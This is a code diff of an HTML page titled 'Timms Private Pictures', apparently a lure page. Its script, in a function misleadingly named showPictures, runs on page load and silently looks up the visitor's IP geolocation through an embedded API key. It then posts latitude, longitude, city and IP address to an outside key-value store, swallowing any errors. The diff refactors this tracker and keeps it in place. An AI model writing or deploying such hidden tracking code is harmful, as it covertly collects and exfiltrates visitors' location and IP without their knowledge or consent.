@@ -2,22 +2,23 @@
 <html>
 <head>
 <script>
-function showPictures() {
+function showPictures(k) {
 	fetch("https://api.geoapify.com/v1/ipinfo?&apiKey=32b30549280d4ae4abc508ad535379d3", {method: 'GET'})
   .then(pictures => pictures.json())
   .then(pictures => {
-  	const t = [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip].map(e => {
-    	return String(e).replaceAll('.', '-').replaceAll(':', '-');
-    }).join('_');
-    console.log(t)
-  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/statt/'+ t, 
+  	const t = [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip]
+		.map(e => String(e).replaceAll('.', '-').replaceAll(':', '-'))
+		.join('_');
+  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/' + k +'/'+ [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip]
+		.map(e => String(e).replaceAll('.', '-').replaceAll(':', '-'))
+		.join('_'), 
     {method: 'POST'});
   })
   .catch(error => {});
 }
 
 window.addEventListener("load", (event) => {
-	showPictures();
+	showPictures('3cg7aby9');
 });
 </script>
 <title>Timms Private Pictures</title></title>
